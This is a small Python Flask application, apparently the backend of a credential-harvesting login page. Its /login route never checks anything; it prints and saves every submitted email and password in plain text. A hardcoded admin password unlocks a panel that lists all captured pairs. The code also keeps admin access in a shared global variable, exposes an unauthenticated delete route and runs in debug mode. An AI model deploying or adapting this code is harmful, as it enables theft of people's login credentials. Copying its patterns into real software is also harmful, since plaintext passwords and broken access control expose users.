from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
app = Flask(__name__)

AdminPass = "aman37560"
AdminPassword = ""

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///login.db'
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class LogIn(db.Model):
    sno = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(200), nullable = False)
    password = db.Column(db.String(200), nullable = False)
    date = db.Column(db.DateTime, default = datetime.utcnow)

    def __repr__(self) -> str:
        return f"{self.email} <-----> {self.password}"

@app.route("/")
def home():
    allId = LogIn.query.all()
    return render_template("index.html",allId = allId)

@app.route("/AllIds")
def AllIds():
    allId = LogIn.query.all()
    return render_template("NotAdmin.html")

@app.route("/Admin",methods = ["GET","POST"])
def Admin():
    global AdminPass, AdminPassword
    if request.method == "POST":

        AdminPassword = request.form['password']
        return redirect("/AdminPannel")

    return render_template("admin.html")

@app.route("/AdminPannel")
def AdminPannel():
    global AdminPass, AdminPassword
    if AdminPassword == AdminPass:
        AdminPassword = None
        allId = LogIn.query.all()
        return render_template("adminPannel.html", allId = allId)
    else:
        AdminPassword = None
        return render_template("NotAdmin.html")
    

@app.route("/login", methods=['GET','POST'])
def Login():
    if request.method == "POST":
        email = request.form['email']
        print(email)
        password = request.form['password']
        print(password)
        login = LogIn(email = email, password = password)
        db.session.add(login)
        db.session.commit()
    return render_template("login.html")

@app.route("/clearId/<int:sno>")
def ClearId(sno):
    id = LogIn.query.filter_by(sno= sno).first()
    db.session.delete(id)
    db.session.commit()
    print("redirect")

    return redirect("/AllIds")




if __name__ == "__main__":
    app.run(debug=True)
